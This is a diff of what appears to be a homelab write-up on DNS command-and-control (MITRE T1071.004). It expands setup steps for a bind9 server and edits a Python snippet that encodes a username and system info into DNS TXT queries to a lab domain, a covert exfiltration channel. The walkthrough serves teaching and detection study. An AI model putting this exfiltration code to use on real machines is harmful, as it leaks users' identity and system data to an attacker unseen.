@@ -10,12 +10,15 @@ author: Alex Jenkins
 | Technique     | T1071     | Application Layer Protocol  |
 | Sub-Technique | T1071.004 | Application Layer Protocol: DNS |
 # Configuration
-## Server
-1. Setup Ubuntu server - I'm using 24.04.2
+For this configuration I am using Ubuntu Server 24.04.2 LTS for my C2 server and Arch Linux for the infected machine. You don't need to use Arch for your host, you can use whatever Linux OS you want. Ubuntu Server is recommended because it's what I've used for this lab and it has nice easy-to-use DNS software ready to install from the package repository. Go ahead and set those two machines up then continue reading for the DNS config.
 
 ### Domain Name System
-Follow this guide: https://documentation.ubuntu.com/server/how-to/networking/install-dns/index.html
-- Install bind9, dnsutils
+First of all, make sure you download bind9 and dnsutils. bind9 is what we will be using as the name server, and dnsutils gives us some common DNS troubleshooting tools like nslookup. Install these with the following command:
+```
+sudo apt-get install bind9 dnsutils
+```
+
+I will be covering all the steps required to get this up and running, but I would encourage you to read (Ubuntu's Tutorial)[https://documentation.ubuntu.com/server/how-to/networking/install-dns/index.html] on setting up a DNS server, which will be much more in-depth than what is included in this post.
 
 **Forward Lookup Zone**
 First modify the /etc/bind/named.conf.local file to include your forward lookup zone file and domain. Mind looks like:
@@ -118,7 +121,7 @@ domain = ".homelab.local"
 encoded_message = f"{encoded_username}.{encoded_system_info}" + domain
 try:
     dns.resolver.resolve(encoded_message, 'TXT')
-except Exception as e:
+except:
     pass
 ```
 
